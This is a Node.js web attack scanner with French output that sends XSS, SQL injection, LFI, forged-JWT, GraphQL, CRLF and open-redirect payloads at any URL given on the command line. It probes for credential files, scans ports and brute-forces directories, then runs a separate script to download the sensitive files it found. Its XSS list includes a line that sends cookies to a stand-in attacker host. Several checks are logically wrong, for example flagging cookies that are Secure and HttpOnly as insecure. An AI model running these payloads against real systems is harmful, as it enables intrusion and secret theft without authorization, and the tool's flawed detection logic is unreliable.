const { request } = require('https');
const { writeFileSync } = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const dns = require('dns');
const net = require('net');
const urlModule = require('url');
const { promisify } = require('util');
const jwt = require('jsonwebtoken');
const { exec } = require('child_process');
const dnsLookup = promisify(dns.lookup);

// Security headers to check
const SECURITY_HEADERS = [
  'content-security-policy', 'x-content-type-options', 'x-frame-options',
  'strict-transport-security', 'referrer-policy', 'permissions-policy', 
  'x-xss-protection', 'x-permitted-cross-domain-policies', 'expect-ct', 
  'cache-control', 'pragma', 'x-download-options', 'x-dns-prefetch-control'
];

// Sensitive paths to check
const SENSITIVE_PATHS = [
   '/env','/.env', '/.git/config', '/wp-config.php', '/phpinfo.php', '/admin/config.yml', 
  '/.htaccess', '/.bash_history', '/.ssh/authorized_keys', '/.aws/credentials', 
  '/config/database.yml', '/config/secrets.yml', '/logs/access.log', '/logs/error.log',
  '/backup.sql', '/database.sql', '/config.php', '/secret.key', '/id_rsa', '/id_rsa.pub',
  '/.npmrc', '/composer.json', '/composer.lock', '/docker-compose.yml', '/nginx.conf', '/robots.txt'
];

// Common ports to scan
const COMMON_PORTS = [80, 443, 22, 21, 8080, 3306, 5432, 8000, 8443];

// Timeout for HTTP requests
axios.defaults.timeout = 5000;

// Check HTTP headers for security best practices
async function checkHeaders(url) {
  return new Promise((resolve) => {
    const req = request(url, { method: 'HEAD' }, (res) => {
      resolve({
        status: res.statusCode,
        headers: res.headers,
        missing: SECURITY_HEADERS.filter(h => !res.headers[h.toLowerCase()])
        .map(h => `⚠️ ${h}`)
      });
    });
    req.on('error', () => resolve(null));
    req.end();
  });
}

// Check for HTTP Response Splitting vulnerabilities
async function checkHTTPResponseSplitting(url) {
  const payloads = [
    '\r\nX-Injected-Header: attack\r\n',
    '%0D%0ASet-Cookie:%20malicious%3Dtrue;',
    '%0D%0ALocation:%20http://malicious.com',
    '%0D%0AContent-Length:%201234\r\n\r\nmalicious-content',
    '%0D%0ATransfer-Encoding:%20chunked\r\n\r\n0\r\n\r\nmalicious-content',
    '%0D%0AExpires:%20Sat,%2005%20Jun%202021%2000:00:00%20GMT',
    '%0D%0ACache-Control:%20no-cache',
    '%0D%0AHost:%20malicious.com'
  ];

  let results = [];

  for (let payload of payloads) {
    const testUrl = `${url}${payload}`;
    try {
      const response = await axios.get(testUrl);
      if (response.status === 200) {
        if (response.headers['x-injected-header'] === 'attack') {
          results.push(`⚠️ HTTP Response Splitting détecté avec l'en-tête: X-Injected-Header`);
        }
        if (response.headers['location'] && response.headers['location'].includes('http://malicious.com')) {
          results.push('⚠️ HTTP Response Splitting détecté avec une redirection malveillante: Location header');
        }
      }
    } catch (error) {
      if (error.response && error.response.status === 200) {
        results.push('⚠️ HTTP Response Splitting détecté avec l\'injection CRLF dans l\'URL');
      }
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité HTTP Response Splitting détectée'];
}

// Test for open redirect vulnerabilities
async function checkOpenRedirect(url) {
  const payloads = [
    'http://attacker.com',
    'javascript:alert("XSS")',
    'ftp://attacker.com',
    'data:text/html,<html><body><h1>Malicious</h1></body></html>',
    'file:///etc/passwd',
    'http://attacker.com?cookie=malicious',
    '%2F%2Fattacker.com',
    'http://localhost',
    'https://attacker.com#malicious',
    'http://attacker.com/evil?redirect=http://attacker.com',
    'http://attacker.com?url=http://attacker.com',
    'http://attacker.com#evil',
    'javascript:eval("window.location=\'http://attacker.com\'")'
  ];

  let results = [];
  for (let payload of payloads) {
    const testUrl = `${url}?redirect=${encodeURIComponent(payload)}`;
    try {
      const response = await axios.get(testUrl);
      if (response.headers.location && response.headers.location.includes(payload)) {
        results.push(`⚠️ Redirection ouverte détectée vers : ${payload}`);
      }
    } catch (error) {}
  }
  return results.length > 0 ? results : ['✅ Aucune redirection ouverte détectée'];
}


// Check for sensitive file paths
async function checkPaths(baseUrl) {
  const results = [];
  const requests = SENSITIVE_PATHS.map(async (path) => {
    const target = new URL(path, baseUrl).href;
    try {
      const res = await axios.head(target);
      if (res.status === 200) results.push(target);
    } catch (error) {}
  });
  await Promise.all(requests);
  return results;
}

// Detect server technologies
async function detectTechnologies(target) {
  try {
    const res = await axios.get(target);
    const serverHeader = res.headers['server'] || 'Non détecté';
    const $ = cheerio.load(res.data);
    const generatorMeta = $('meta[name="generator"]').attr('content');
    return {
      server: serverHeader,
      generator: generatorMeta || 'Aucun'
    };
  } catch (error) {
    return { server: 'Erreur lors de la requête', generator: 'N/A' };
  }
}

// Detect CORS misconfigurations
async function checkCORS(url) {
  const results = [];
  const parsedUrl = new URL(url);

  const securityTests = [
    {
      name: 'Reflect Origin sans validation',
      method: 'GET',
      headers: { Origin: 'http://evil.com' },
      check: (res) => {
        const acao = res.headers['access-control-allow-origin'];
        return acao === 'http://evil.com' 
          ? '⚠️ CORS : Reflect Origin sans validation' 
          : '✅ Validation Origin correcte';
      }
    },
    {
      name: 'Wildcard avec credentials',
      method: 'GET',
      headers: { Origin: parsedUrl.origin },
      withCredentials: true,
      check: (res) => {
        const isDangerous = res.headers['access-control-allow-origin'] === '*' 
                          && res.headers['access-control-allow-credentials'] === 'true';
        return isDangerous 
          ? '⚠️ CORS : Configuration dangereuse (* + Allow-Credentials)' 
          : '✅ Configuration Credentials sécurisée';
      }
    },
    {
      name: 'Méthodes HTTP permissives',
      method: 'OPTIONS',
      headers: {
        Origin: parsedUrl.origin,
        'Access-Control-Request-Method': 'PUT' 
      },
      check: (res) => {
        const methods = res.headers['access-control-allow-methods']?.split(',').map(m => m.trim());
        const risky = methods?.some(m => ['PUT', 'DELETE'].includes(m));
        return risky 
          ? `⚠️ CORS : Méthodes risquées autorisées (${methods})` 
          : '✅ Méthodes HTTP sécurisées';
      }
    },
    {
      name: 'Validation des headers',
      method: 'OPTIONS',
      headers: {
        Origin: parsedUrl.origin,
        'Access-Control-Request-Headers': 'X-Evil-Header'
      },
      check: (res) => {
        const allowedHeaders = res.headers['access-control-allow-headers']?.split(',').map(h => h.trim());
        return allowedHeaders?.includes('X-Evil-Header') 
          ? '⚠️ CORS : Header non validé autorisé' 
          : '✅ Validation des headers correcte';
      }
    }
  ];
  try {
    const httpUrl = url.replace('https://', 'http://');
    const res = await axios.get(httpUrl, { maxRedirects: 0, validateStatus: null });
    
    if ([301, 302, 307, 308].includes(res.status)) {
      results.push('✅ Redirection HTTPS correcte');
    } else {
      results.push('⚠️ CORS : HTTPS disponible en HTTP sans redirection');
    }
  } catch (error) {
    results.push('✅ Redirection HTTPS correcte (Erreur contrôlée)');
  }
  for (const test of securityTests) {
    try {
      const res = await axios({
        url,
        method: test.method,
        headers: test.headers,
        withCredentials: test.withCredentials || false,
        validateStatus: () => true 
      });
      results.push(test.check(res));
    } catch (error) {
      results.push(`⚠️ Erreur technique (${test.name}): ${error.message}`);
    }
  }
  return results;
}

// Perform DNS lookup to find IP addresses
async function performDNSLookup(domain) {
  try {
    const addresses = await dnsLookup(domain, { all: true });
    return addresses;
  } catch (error) {
    return [];
  }
}

// Scan common ports for open ports
async function performPortScan(target) {
  const openPorts = [];
  const portScanPromises = COMMON_PORTS.map(port =>
    new Promise((resolve) => {
      const socket = net.createConnection(port, target);
      socket.setTimeout(1000);
      socket.on('connect', () => {
        openPorts.push(port);
        socket.end();
        resolve();
      });
      socket.on('error', () => resolve());
      socket.on('timeout', () => resolve());
    })
  );
  await Promise.all(portScanPromises);
  return openPorts;
}

// Check for insecure cookies
async function checkCookies(url) {
  const insecureCookies = [];
  try {
    const res = await axios.get(url);
    const cookies = res.headers['set-cookie'] || [];
    cookies.forEach(cookie => {
      const cookieDetails = parseCookie(cookie);
      if (cookieDetails.secure && cookieDetails.httpOnly) {

        insecureCookies.push(`⚠️ Cookie non sécurisé détecté: ${cookie}`);
      }
      if (!cookieDetails.sameSite || (cookieDetails.sameSite === 'None' && !cookieDetails.secure)) {
        insecureCookies.push(`⚠️ Cookie avec SameSite vulnérable ou mal configuré: ${cookie}`);
      }
    });
    return {
      insecureCookies,
    };
  } catch (error) {
    console.error(`Erreur lors de la récupération des cookies : ${error.message}`);
    return {
      insecureCookies: ["⚠️ Erreur lors de la récupération des cookies"],
    };
  }
}
function parseCookie(cookie) {
  const cookieDetails = {
    secure: false,
    httpOnly: false,
    sameSite: null
  };
  if (cookie.includes('Secure')) cookieDetails.secure = true;
  if (cookie.includes('HttpOnly')) cookieDetails.httpOnly = true;
  const sameSiteMatch = cookie.match(/SameSite=(Strict|Lax|None)/);
  if (sameSiteMatch) cookieDetails.sameSite = sameSiteMatch[1];
  return cookieDetails;
}

// Test for session fixation vulnerabilities
async function testSessionFixation(url) {
  try {
    const res = await axios.get(url);
    const sessionCookie = res.headers['set-cookie']?.find(cookie => cookie.startsWith('PHPSESSID='));
    if (sessionCookie) {
      const sessionId = sessionCookie.split(';')[0].split('=')[1];
      const payloads = [
        `${url}?PHPSESSID=${sessionId}`,
        `${url}&PHPSESSID=${sessionId}`,
        `${url}#PHPSESSID=${sessionId}`,
        `${url}?session_id=${sessionId}`,
        `${url}?login=admin&PHPSESSID=${sessionId}`,
        `${url}?auth_token=${sessionId}`,
        `${url}?redirect=${sessionId}`
      ];
      const results = await Promise.all(payloads.map(payload => 
        axios.get(payload).catch(() => null)
      ));
      if (results.some(res => res && res.status === 200)) {
        return ['⚠️ Fixation de session possible'];
      }
    }
  } catch (error) {
    console.error(`Erreur lors de la vérification de la fixation de session : ${error.message}`);
  }
  return ['✅ Pas de vulnérabilité de fixation de session détectée'];
}

// Check for XSS vulnerabilities
async function checkXSS(target) {
  const payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)' />", 
    "<svg/onload=alert(1)>", 
    "<a href='javascript:alert(1)'>click me</a>", 
    "<body onload=alert('XSS')>", 
    "<iframe src='javascript:alert(1)'></iframe>",
    "<div style='background-image: url(javascript:alert(1))'>Test</div>",
    "<object data='javascript:alert(1)' type='text/html'></object>", 
    "<img src='x' style='background-image: url(javascript:alert(1))'>", 
    "<input type='text' value='<img src=x onerror=alert(1)>' />", 
    "<audio autoplay><source src='javascript:alert(1)'></audio>",
    "<video onplay='alert(1)'><source src='fake'></video>",
    "<svg><script>alert('XSS')</script></svg>", 
    "<script>eval('alert(1)')</script>", 
    "<script>setTimeout(() => { alert(1); }, 0)</script>", 
    "<a href='javascript:void(0)' onmouseover='alert(1)'>mouseover me</a>", 
    "<details open><summary onclick='alert(1)'>Click here</summary></details>", 
    "<input type='text' value='<script>document.write(\"<img src=1 onerror=alert(1)>\")</script>' />", 
    "<script>window.location='javascript:alert(1)'</script>", 
    "<script src='//example.com/xss.js'></script>", 
    "<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>", 
    "<script>eval('var a = 1 + 2; alert(a)')</script>" 
  ];

  let results = [];

  for (let payload of payloads) {
    const testParam = `${target}?q=${encodeURIComponent(payload)}`;
    try {
      const response = await axios.get(testParam);
      if (response.data.includes(payload)) {
        results.push(`⚠️  XSS détecté avec le payload: ${payload}`);
      }
    }
    catch (error) {
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité détectée'];
}

// Check for SQL injection vulnerabilities
async function sqli(target) {
  const payloads = [
    "1' OR '1'='1",
    "1' --",
    "1' /*",
    '1" OR "1"="1',
    "1' UNION SELECT NULL, NULL, NULL --",
    "1' OR SLEEP(5) --",
    "1' AND IF(1=1, SLEEP(5), 0) --",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*), CONCAT(0x3a,(SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y) --", // Extract database name
    "1' AND (SELECT 1 FROM(SELECT COUNT(*), CONCAT(0x3a,(SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y) --", // Extract user
    "1' AND (SELECT 1 FROM(SELECT COUNT(*), CONCAT(0x3a,(SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y) --", // Extract DB version
    "1' AND (SELECT 1 FROM(SELECT COUNT(*), GROUP_CONCAT(table_name) FROM information_schema.tables GROUP BY table_schema) y) --", // List table names
    "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --", 
    "1' AND 1=CONVERT(int, 0x3a) --", 
    "1' AND 1=CONVERT(int, 0x73656c656374) --", 
    "1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --", 
    "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --", 
    "1' AND (SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END) --", 
    "1' AND 1=1 GROUP BY CONCAT(username,0x3a,password) HAVING MIN(0) --", 
    "1' AND (SELECT 1 FROM users WHERE username = 'admin' LIMIT 1) --", 
    "1' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') --",
    "1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
    "1' AND (SELECT CASE WHEN (1=1) THEN BENCHMARK(1000000, MD5(1)) END) --",
  ];

  let results = [];

  for (let payload of payloads) {
    const testParam = `${target}?q=${encodeURIComponent(payload)}`;
    try {
      const response = await axios.get(testParam);
      if (response.data.includes('error in your SQL syntax') || response.data.includes('mysql')) {
        results.push(`⚠️  SQLi détecté avec le payload: ${payload}`);
      }
    } catch (error) {
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité détectée'];
}

// Check for Local File Inclusion vulnerabilities
async function lfi(target) {
  const payloads = [
    "../../../../../../../../../../../etc/passwd", 
    "../../../../../../../../../../../etc/hosts", 
    "../../../../../../../../../../../var/log/syslog", 
    "../../../../../../../../../../../var/log/auth.log",
    "../../../../../../../../../../../.git/config", 
    "../../../../../../../../../../../.env", 
    "../../../../../../../../../../../.bash_history",
    "../../../../../../../../../../../var/log/apache2/error.log",
    "../../../../../../../../../../../etc/passwd%00", 
    "../../../../../../../../../../../var/www/html/index.php%00",
    "../../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../../var/lib/mysql/mysql.sock",  
    "../../../../../../../../../../../var/run/docker.sock", 
    "../../../../../../../../../../../etc/mysql/my.cnf",  
    "../../../../../../../../../../../.ssh/id_rsa", 
    "../../../../../../../../../../../var/www/.htaccess", 
    "../../../../../../../../../../../tmp/php.ini", 
    "../../../../../../../../../../../var/log/nginx/access.log", 
    "../../../../../../../../../../../etc/cron.d/cronfile", 
    "../../../../../../../../../../../home/user/.ssh/authorized_keys", 
    "../../../../../../../../../../../etc/systemd/system/cron.service",
    "../../../../../../../../../../../home/user/.gitconfig", 
    "../../../../../../../../../../../var/spool/mail/user",
    "../../../../../../../../../../../var/www/html/wp-config.php",
    "../../../../../../../../../../../etc/selinux/config",
    "../../../../../../../../../../../var/www/html/.git/index",
  ];

  let results = [];

  for (let payload of payloads) {
    const testParam = `${target}?q=${encodeURIComponent(payload)}`;
    try {
      const response = await axios.get(testParam);
      if (response.data.includes("root:x:0:0:root:/root:/bin/bash") || 
          response.data.includes("etc/passwd") || 
          response.data.includes("bash_history") ||
          response.data.includes("mysql.sock") || 
          response.data.includes("my.cnf") || 
          response.data.includes(".gitconfig") ||
          response.data.includes("authorized_keys") || 
          response.data.includes("index.php") || 
          response.data.includes("access.log")) {
        results.push(`⚠️  LFI détecté avec le payload: ${payload}`);
      }
    } catch (error) {
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité détectée'];
}

// JWT vulnerabilities checker
async function JWT(target) {
  const payloads = [
    { user: 'admin', role: 'admin' },
    { user: 'attacker', role: 'user' },
    { exp: Math.floor(Date.now() / 1000) - 60 }, 
    { exp: Math.floor(Date.now() / 1000) + 60 * 60 }, 
    { foo: 'bar' },
    { iat: Math.floor(Date.now() / 1000) - 3600 }, 
    { exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 }, 
    { jti: 'test_jti' },
  ];

  let results = [];

  const tokenWithNoSignature = jwt.sign(payloads[0], '', { algorithm: 'none' });
  const tokenWithExpiredExp = jwt.sign({ exp: Math.floor(Date.now() / 1000) - 3600 }, 'fake-secret-key', { algorithm: 'HS256' });
  const tokenWithFutureExp = jwt.sign({ exp: Math.floor(Date.now() / 1000) + 3600 }, 'fake-secret-key', { algorithm: 'HS256' });
  try {
    const response = await axios.get(`${target}?token=${encodeURIComponent(tokenWithNoSignature)}`);
    if (response.data.includes('authorized') || response.status === 200) {
      results.push('⚠️  Jeton JWT avec algorithme "none" accepté');
    }
  } catch (error) {}
  try {
    const response = await axios.get(`${target}?token=${encodeURIComponent(tokenWithExpiredExp)}`);
    if (response.status === 200 || response.data.includes('authorized')) {
      results.push('⚠️  Jeton JWT expiré accepté');
    }
  } catch (error) {}

  try {
    const response = await axios.get(`${target}?token=${encodeURIComponent(tokenWithFutureExp)}`);
    if (response.status === 200 || response.data.includes('authorized')) {
      results.push('⚠️  Jeton JWT avec expiration future accepté');
    }
  } catch (error) {}
  const algorithmsToTest = ['HS256', 'HS384', 'HS512', 'RS256', 'ES256', 'ES384', 'PS256'];
  for (const algorithm of algorithmsToTest) {
    for (const payload of payloads) {
      try {
        const token = jwt.sign(payload, 'fake-secret-key', { algorithm });
        const response = await axios.get(`${target}?token=${encodeURIComponent(token)}`);
        if (response.data.includes('authorized') || response.status === 200) {
          results.push(`⚠️  Jeton JWT avec l'algorithme "${algorithm}" accepté et payload: ${JSON.stringify(payload)}`);
        }
      } catch (error) {}
    }
  }
  const tokenWithCustomClaims = jwt.sign({ user: 'attacker', role: 'admin', customClaim: 'malicious' }, 'fake-secret-key', { algorithm: 'HS256' });
  try {
    const response = await axios.get(`${target}?token=${encodeURIComponent(tokenWithCustomClaims)}`);
    if (response.data.includes('authorized') || response.status === 200) {
      results.push('⚠️  Jeton JWT avec des claims personnalisés accepté');
    }
  } catch (error) {}
  return results.length > 0 ? results : ['✅ Pas de vulnérabilité JWT détectée'];
}

// GraphQL Vulnerabilities detection
async function detectGraphQLVulnerabilities(target) {
  const introspectionQuery = `{__schema {types {name}}}`;

  const maliciousQueries = [
    `{ user(id: "1") { password } }`, 
    `{ users { id name email password } }`, 
    `{ query: invalidQuery }`, 
    `{ secretField }`, 
    `{ __typename }`,
    `{ posts { sensitiveData } }`
  ];

  const fieldInjectionQueries = [
    `{ login(username: "admin", password: "admin") { token } }`, 
    `{ user(id: "1") { password } }`, 
    `{ createAccount(username: "attacker", password: "password") { id name } }`
  ];

  const securityHeaderTest = [
    { key: 'Authorization', value: 'Bearer invalidtoken' },
    { key: 'X-Api-Key', value: 'invalidapikey' }
  ];

  let results = [];

  try {
    const response = await axios.post(target, {
      query: introspectionQuery
    });
    if (response.data && response.data.data && response.data.data.__schema) {
      results.push('⚠️ Introspection activée : les détails de l\'API GraphQL sont exposés');
    }
  } catch (error) {
    results.push('✅ Introspection désactivée');
  }
  for (let query of maliciousQueries) 
    { try {
      const response = await axios.post(target, {
        query: query
      });
      if (response.data.errors || response.data.data) {
        results.push(`⚠️ Requête malveillante acceptée : ${query}`);
      }
    } catch (error) {
    }
  } try {
    const response = await axios.post(target, {
      query: '{ invalidField }'
    });
    if (response.data.errors) {
      results.push('⚠️ Exposition d\'informations sensibles via les erreurs');
    }
  } catch (error) {
  }

  for (let query of fieldInjectionQueries) {
    try {
      const response = await axios.post(target, {
        query: query
      });
      if (response.data.errors || response.data.data) {
        results.push(`⚠️ Injection de champ malveillant acceptée : ${query}`);
      }
    } catch (error) {
    }
  }

  for (let header of securityHeaderTest) {
    try {
      const response = await axios.post(target, {
        query: introspectionQuery
      }, {
        headers: { [header.key]: header.value }
      });
      if (response.status === 200 || response.data.errors) {
        results.push(`⚠️ En-tête de sécurité faible détecté: ${header.key}: ${header.value}`);
      }
    } catch (error) {
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité détectée'];
}


// Bruteforce directory attack
async function attackBrutForce(baseUrl) {
  const results = [];
  const timeout = 5000; 
  const headersList = [
    { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' },
    { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' },
    { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0' },
    { 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36' },
    { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' },
  ];

  const COMMON_DIRECTORIES = [
    '/admin', '/hidden', '/backup', '/uploads', '/private', '/config', '/secure', '/data', 
    '/files', '/logs', '/temp', '/management', '/assets', '/api', '/static', '/wp-admin', 
    '/admin_panel', '/dashboard', '/cms', '/db_backup', '/test', '/public'
  ];

  for (const path of COMMON_DIRECTORIES) {
    const targetUrl = `${baseUrl}${path}`;
    const headers = headersList[Math.floor(Math.random() * headersList.length)];
    const extendedHeaders = {
      ...headers,
      'Referer': baseUrl,
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
    };
    try {
      const response = await axios.head(targetUrl, { timeout, headers: extendedHeaders });
      if (response.status === 200) {
        results.push(`⚠️ Répertoire accessible : ${targetUrl} (Status: 200 OK)`);
      } else if (response.status === 403) {
        results.push(`⚠️ Répertoire protégé trouvé : ${targetUrl} (Status: 403 Forbidden)`);
      } else if (response.status === 401) {
        results.push(`⚠️ Répertoire protégé trouvé : ${targetUrl} (Status: 401 Unauthorized)`);
      }
    } catch (error) {
      if (error.response) {
        if (error.response.status === 404) {
          console.log(`🔍 Répertoire non trouvé : ${targetUrl}`);
        } else {
          console.log(`⚠️ Erreur inattendue pour ${targetUrl}: ${error.response.status}`);
        }
      } else if (error.request) {
        console.log(`⚠️ Pas de réponse pour ${targetUrl}`);
      } else {
        console.log(`⚠️ Erreur dans la requête pour ${targetUrl}: ${error.message}`);
      }
    }
  }
  return results.length > 0 ? results : ['✅ Aucun répertoire sensible détecté.'];
}

// CRF attack detection
async function detectCSRF(target) {
  const csrfTestPayloads = [
    { method: 'POST', body: { username: 'attacker', password: 'password' }, description: 'Test POST avec données utilisateur malveillantes' },
    { method: 'PUT', body: { id: '1', name: 'attacker' }, description: 'Test PUT avec modification de données utilisateur' },
    { method: 'DELETE', body: { id: '1' }, description: 'Test DELETE pour suppression de données sensibles' }
  ];

  const csrfHeaderTest = [
    { key: 'X-CSRF-Token', value: 'invalid_token', description: 'Envoi d\'un token CSRF invalide' },
    { key: 'X-CSRF-Token', value: '', description: 'Envoi d\'un token CSRF vide' },
    { key: 'X-CSRF-Token', value: '123456', description: 'Envoi d\'un token CSRF arbitraire' }
  ];

  let results = [];

  for (let { method, body, description } of csrfTestPayloads) {
    try {
      const response = await axios({
        method,
        url: target,
        data: body
      });
      if (response.status === 200 || response.data.errors) {
        results.push(`⚠️ CSRF potentiel détecté avec méthode ${method} (${description}). Réponse: ${response.status}`);
      } else {
        results.push(`✅ Aucune vulnérabilité détectée pour la méthode ${method} (${description}).`);
      }
    } catch (error) {
      results.push(`⚠️ Erreur lors du test de CSRF avec la méthode ${method} (${description}): ${error.message}`);
    }
  }
  for (let { key, value, description } of csrfHeaderTest) {
    try {
      const response = await axios({
        method: 'POST',
        url: target,
        data: { username: 'attacker', password: 'password' },
        headers: { [key]: value }
      });
      if (response.status === 200 || response.data.errors) {
        results.push(`⚠️ En-tête CSRF manquant ou vulnérable détecté: ${key}: ${value}. Description: ${description}. Réponse: ${response.status}`);
      } else {
        results.push(`✅ En-tête CSRF correct détecté avec valeur: ${value}. Description: ${description}.`);
      }
    } catch (error) {
      results.push(`⚠️ Erreur lors du test de CSRF avec en-tête ${key}: ${value}. Description: ${description}: ${error.message}`);
    }
  }
  return results.length > 0 ? results : ['✅ Aucune vulnérabilité CSRF détectée'];
}


/////////////////////// RAPPORT CONSOLE.LOG ////////////////////////////

const reportFileName = process.argv[3] || 'security_report.json';
async function generateReport(target) {
  try {
    const parsedUrl = new urlModule.URL(target);
    const hostname = parsedUrl.hostname;

    const security = await checkHeaders(target);
    if (!security) return console.log('Connexion impossible');

    const techInfo = await detectTechnologies(target);
    const sensitiveFiles = await checkPaths(target);
    const corsTestResults = await checkCORS(target);
    const dnsInfo = await performDNSLookup(hostname);
    const openPorts = await performPortScan(hostname);
    const insecureCookies = await checkCookies(target);
    const testSessionFixationResults = await testSessionFixation(target);
    const xssResults = await checkXSS(target);
    const hasSQLiVulnerability = await sqli(target);
    const hasLFIVulnerability = await lfi(target);
    const jwtResults = await JWT(target);
    const graphqlResults = await detectGraphQLVulnerabilities(target);
    const bruteforceResults = await attackBrutForce(target);
    const csrfResults = await detectCSRF(target);
    const httpResponseSplittingResults = await checkHTTPResponseSplitting(target);
    const openRedirectResults = await checkOpenRedirect(target);




    console.log('\n=== Rapport de sécurité ===');
    console.log(`Cible: ${target}`);

    console.log('\n[En-têtes de sécurité]:');
    security.missing.length > 0 
      ? security.missing.forEach(h => console.log(`❌ ${h}`))
      : console.log('✅ Tous les en-têtes sont présents');
    
      console.log('\n[Vulnérabilité HTTP Response Splitting]:');
      if (httpResponseSplittingResults.length > 0) {
        httpResponseSplittingResults.forEach(result => console.log(result));
      } else {
        console.log('✅ Pas de vulnérabilité HTTP Response Splitting détectée');
      }

    console.log('\n[Fichiers sensibles]:');
    sensitiveFiles.length > 0 
      ? sensitiveFiles.forEach(p => console.log(`⚠️  ${p}`))
      : console.log('✅ Aucun fichier exposé détecté');

    console.log('\n[Technologies]:');
    console.log(`Serveur: ${techInfo.server}`);
    console.log(`Générateur: ${techInfo.generator}`);

    console.log('\n[Informations DNS]:');
    dnsInfo.forEach(info => console.log(`Adresse IP: ${info.address} (IPv${info.family})`));

    console.log('\n[Ports ouverts]:');
    openPorts.length > 0 
      ? openPorts.forEach(port => console.log(`⚠️  Port ${port} ouvert`))
      : console.log('✅ Aucun port ouvert détecté sur la plage vérifiée');

    console.log('\n[Cookies non sécurisés]:');
    if (insecureCookies.length > 0) {
      insecureCookies.forEach(cookie => console.log(`⚠️ Cookie non sécurisé détecté: ${cookie}`));
    } else {
      console.log('✅ Tous les cookies sont sécurisés');
    }

    console.log('\n[Vulnérabilité XSS]:');
    if (xssResults && xssResults.length > 0) {
      xssResults.forEach(result => console.log(result));
    } else {
      console.log('✅ Pas de XSS détecté');
    }

    console.log('\n[Vulnérabilité SQLi]:');
    if (hasSQLiVulnerability && hasSQLiVulnerability.length > 0) {
      hasSQLiVulnerability.forEach(result => console.log(result));
    } else {
      console.log('✅ Pas de SQLi détecté');
    }

    console.log('\n[Vulnérabilité LFI]:');
    if (hasLFIVulnerability && hasLFIVulnerability.length > 0) {
      hasLFIVulnerability.forEach(result => console.log(result));
    } else {
      console.log('✅ Pas de LFI détecté');
    }

    console.log('\n[Vulnérabilité JWT]:');
    if (jwtResults && jwtResults.length > 0) {
      jwtResults.forEach(result => console.log(result));
    } else {
      console.log('✅ Pas de vulnérabilité JWT détectée');
    }

    console.log('\n[Vulnérabilités GraphQL]:');
    if (graphqlResults && graphqlResults.length > 0) {
      graphqlResults.forEach(result => console.log(result));
    } else {
      console.log('✅ Aucune vulnérabilité GraphQL détectée');
    }

    console.log('\n[Attaque par force brute]:');
    if (bruteforceResults && bruteforceResults.length > 0) {
      bruteforceResults.forEach(result => console.log(result));
    } else {
      console.log('✅ Aucun répertoire sensible détecté');
    }

    console.log('\n[Attaque CSRF]:');
    if (csrfResults && csrfResults.length > 0) {
      csrfResults.forEach(result => console.log(result));
    } else {
      console.log('✅ Aucune vulnérabilité CSRF détectée');
    }

    console.log('\n[Redirection ouverte]:');
    if (openRedirectResults && openRedirectResults.length > 0) {
      openRedirectResults.forEach(result => console.log(result));
    }
    else {
      console.log('✅ Aucune redirection ouverte détectée');
    }

    console.log('\n[Fixation de session]:');
    if (testSessionFixationResults && testSessionFixationResults.length > 0) {
      testSessionFixationResults.forEach(result => console.log(result));
    }
    else {
      console.log('✅ Pas de vulnérabilité de fixation de session détectée');
    }

    console.log('\n[Configuration CORS]:');
    if (corsTestResults && corsTestResults.length > 0) {
      corsTestResults.forEach(result => console.log(result));
    }
    else {
      console.log('✅ Configuration CORS sécurisée');
    }

    const timestamp = new Date().toISOString();
    const report = {
      timestamp,
      target,
      headers: { missing: security.missing },
      httpResponseSplittingResults,
      openRedirectResults,
      technologies: techInfo,
      corsTestResults,
      sensitiveFiles,
      dnsInfo,
      openPorts,
      insecureCookies,
      testSessionFixationResults,
      xssResults,
      hasSQLiVulnerability,
      hasLFIVulnerability,
      jwtResults,
      graphqlResults,
      bruteforceResults,
      csrfResults,
    };

    writeFileSync(reportFileName, JSON.stringify(report, null, 2));
    console.log(`Rapport sauvegardé sous ${reportFileName}`);

    exec('node downloadSensitiveFiles.js', (error, stderr) => {
      if (error) {
        console.log(`Erreur d'exécution : ${error.message}`);
        return;
      }
      if (stderr) {
        console.log(`Erreur standard : ${stderr}`);
        return;
      }
      console.log(`FICHIER SENSIBLES TÉLÉCHARGÉS`);
    });
    
  } catch (error) {
    console.log('Erreur:', error.message);
  }
}

const target = process.argv[2];

if (!target) {
  console.log('Usage: node scanner.js <url> [output_filename.json]');
  process.exit(1);
}

generateReport(target);